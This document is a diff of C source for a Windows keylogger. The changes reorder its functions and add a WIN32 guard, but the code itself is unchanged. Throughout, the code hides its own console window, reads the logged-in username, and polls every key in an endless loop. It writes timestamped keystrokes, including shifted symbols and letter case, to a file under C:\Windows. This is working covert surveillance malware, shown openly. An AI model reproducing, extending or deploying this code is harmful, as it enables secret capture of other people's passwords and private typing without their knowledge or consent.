@@ -1,108 +1,14 @@
 // This program will only work with window 2000 version or above.
-
+#ifdef WIN32
 #include"keylogger.h"
 #include<stdio.h>
-
-#include "windows.h"
-
 #include<string.h>
 #include<stdlib.h>
 #include<time.h>
 
-void Stealth(); // function to hide console window.
-
-int special_keys(int , FILE *); // function to identify special_keys.
-
 int isCapsLock(void) // function to check status of caps lock.
 {
   return (GetKeyState(VK_CAPITAL) & 0x0001);
-}
-
-int kwindows(void)
-{
-  FILE *fp = NULL ;
-  fp = fopen("C:\\Windows\\Keylogs.txt","w");
-  if(fp == NULL)
-    exit(EXIT_FAILURE);
-
-  Stealth();
-  char val[5] , time[35] = {0}  ;
-  FILE *username = NULL ;
-  char user[30] ;
-  username = _popen("echo %username%","r");
-  fgets(user,30,username);
-  if(username)
-    {
-      fputs("Logged User:",fp);
-      fputs(user,fp);
-      fputs("\n",fp);
-    }
-  else
-    fputs("****Unable To fetch user-name.****\n",fp);
-
-  while(1)
-    {
-      Sleep(10);
-      for(int i=8;i<255;i++) // 8-255 represents range of possible key value using ascii codes. Source : https://www.asciitable.com/
-	{
-	  // Info About GetAsyncKeyState(): https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
-	  fflush(fp); // To flush fp stream.
-	  if(GetAsyncKeyState(i)==-32767 && special_keys(i,fp)) // -32767 represents value in most significant bit is up( ie 1 ) which means key was pressed .
-	    {
-	      if (i >= 39 && i <= 64 ) // Keys 0-9
-		{
-		  format_time(time);
-		  fputs(time,fp);
-		  if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
-		    {
-		      switch (i)
-			// 0x30-0x39 is 0-9 respectively
-			{
-			case 0x30: fputs(")",fp);
-			  break;
-			case 0x31: fputs("!",fp);
-			  break;
-			case 0x32: fputs("@",fp);
-			  break;
-			case 0x33: fputs("#",fp);
-			  break;
-			case 0x34: fputs("$",fp);
-			  break;
-			case 0x35: fputs("%",fp);
-			  break;
-			case 0x36: fputs("^",fp);
-			  break;
-			case 0x37: fputs("&",fp);
-			  break;
-			case 0x38: fputs("*",fp);
-			  break;
-			case 0x39: fputs("(",fp);
-			  break;
-			}
-		    }
-		  else // if shift key is not down
-		    {
-		      sprintf(val, "%c", i);
-		      fputs(val,fp);
-		    }
-		  fputs("\n",fp);
-		}
-	      else if( i > 64 && i< 91 )
-		{
-		  format_time(time);
-		  fputs(time,fp);
-		  if ((GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) // Check if letters should be lowercase it will not work when caps lock is set and shift is used.
-		    sprintf(val,"%c",i);
-		  else
-		    sprintf(val,"%c",i+32);
-		  fputs(val,fp);
-		  fputs("\n",fp);
-		}
-	    }
-	}
-    }
-  fclose(fp);
-  return 0 ;
 }
 
 void Stealth()
@@ -110,7 +16,8 @@ void Stealth()
   HWND Stealth;
   AllocConsole(); // Allocate a new console for calling process.
   Stealth = FindWindowA("ConsoleWindowClass", NULL);
-  ShowWindow(Stealth, 0); // ShowWindow() control how windows is shown and 0 represents SW_HIDE which means hide the window and activate another window.
+  // control how windows is shown and 0 represents SW_HIDE which means hide the window and activate another window.
+  ShowWindow(Stealth, 0); 
 }
 
 int special_keys(int key , FILE *fp)
@@ -314,7 +221,6 @@ int special_keys(int key , FILE *fp)
       else
 	strcpy(print_key,"=");
       break;
-
     default : return 1 ;
     }
   format_time(time);
@@ -324,3 +230,91 @@ int special_keys(int key , FILE *fp)
   return 0 ;
 }
 
+int kwindows(void)
+{
+  FILE *fp = NULL ;
+  fp = fopen("C:\\Windows\\Keylogs.txt","w");
+  if(fp == NULL)
+    exit(EXIT_FAILURE);
+
+  Stealth();
+  char val[5] , time[35] = {0}  ;
+  FILE *username = NULL ;
+  char user[30] ;
+  username = _popen("echo %username%","r");
+  fgets(user,30,username);
+  if(username)
+    {
+      fputs("Logged User:",fp);
+      fputs(user,fp);
+      fputs("\n",fp);
+    }
+  else
+    fputs("****Unable To fetch user-name.****\n",fp);
+
+  while(1)
+    {
+      Sleep(10);
+      for(int i=8;i<255;i++) // 8-255 represents range of possible key value using ascii codes. Source : https://www.asciitable.com/
+	{
+	  // Info About GetAsyncKeyState(): https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
+	  fflush(fp); 
+	  if(GetAsyncKeyState(i)==-32767 && special_keys(i,fp)) // -32767 represents value in most significant bit is up( ie 1 ) which means key was pressed .
+	    {
+	      if (i >= 39 && i <= 64 ) // Keys 0-9
+		{
+		  format_time(time);
+		  fputs(time,fp);
+		  if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
+		    {
+		      switch (i)
+			// 0x30-0x39 is 0-9 respectively
+			{
+			case 0x30: fputs(")",fp);
+			  break;
+			case 0x31: fputs("!",fp);
+			  break;
+			case 0x32: fputs("@",fp);
+			  break;
+			case 0x33: fputs("#",fp);
+			  break;
+			case 0x34: fputs("$",fp);
+			  break;
+			case 0x35: fputs("%",fp);
+			  break;
+			case 0x36: fputs("^",fp);
+			  break;
+			case 0x37: fputs("&",fp);
+			  break;
+			case 0x38: fputs("*",fp);
+			  break;
+			case 0x39: fputs("(",fp);
+			  break;
+			}
+		    }
+		  // if shift key is not down
+		  else 
+		    {
+		      sprintf(val, "%c", i);
+		      fputs(val,fp);
+		    }
+		  fputs("\n",fp);
+		}
+	      else if( i > 64 && i< 91 )
+		{
+		  format_time(time);
+		  fputs(time,fp);
+		  if ((GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) // Check if letters should be lowercase it will not work when caps lock is set and shift is used.
+		    sprintf(val,"%c",i);
+		  else
+		    sprintf(val,"%c",i+32);
+		  fputs(val,fp);
+		  fputs("\n",fp);
+		}
+	    }
+	}
+    }
+  fclose(fp);
+  return 0 ;
+}
+#endif
